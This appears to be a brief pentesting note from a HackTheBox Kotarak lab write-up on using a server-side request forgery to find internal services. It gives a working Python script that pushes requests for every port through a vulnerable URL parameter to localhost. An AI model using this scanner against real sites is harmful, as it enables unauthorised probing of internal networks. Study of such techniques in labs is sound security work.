### Bruteforce Internal Services


If you can browse localhost,
you might be able to bruteforce for internally running services (ports that aren't exposed to the wider internet)
â—‡ example of this from hackthebox Kotarak

Python script to brute force internal port (used in hackthebox Kotarak):
import requests

for port in range(1,65535):
    url = "http://kotarak.htb:60000/url.php?path=http://localhost:" + str(port)
    response = requests.get(url)

    if len(response.content) > 2:
        print(port)

print("\nFinished!")
